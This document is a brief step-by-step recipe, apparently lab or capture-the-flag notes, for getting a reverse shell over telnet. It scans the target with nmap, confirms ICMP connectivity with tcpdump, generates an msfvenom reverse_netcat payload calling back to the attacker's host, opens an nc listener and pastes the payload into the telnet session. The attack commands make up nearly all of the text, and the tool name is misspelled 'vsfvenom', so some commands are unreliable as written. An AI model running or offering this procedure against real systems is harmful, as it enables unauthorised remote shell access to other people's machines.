# Telnet payload msfvenom

-------------------------

### Connection with telnet

In order to get a reverse shell on telnet, first scan the host to see if it has telnet running:

````
sudo nmap -sS -sV -p- -O ip
````

Get the port (usually 23 but not always).
In another window, run tcpdump for check connectivity:

````
sudo tcpdump ip proto \\icmp -i interface
````

interface: check with ifconfig to see the name of your interface.

After that try to connect from your machine, if you can, run a ping to your machine.

````
telnet ip port
````

If you have connection, and tcpdump can see the traffic of the ping, generate a payload on vsfvemon to get the reverse shell:

````
vsfvenom -p cmd/unix/reverse_netcat LHOST=yourip LPORT=aportyouwant
````

Copy the payload generated and save it.

Now run a new tab with the following command:

````
nc -lnvp portyouchooseonpayload
````

Now paste the payload you saved on the telnet connection:

````
.RUN payload
````

Should have connection.
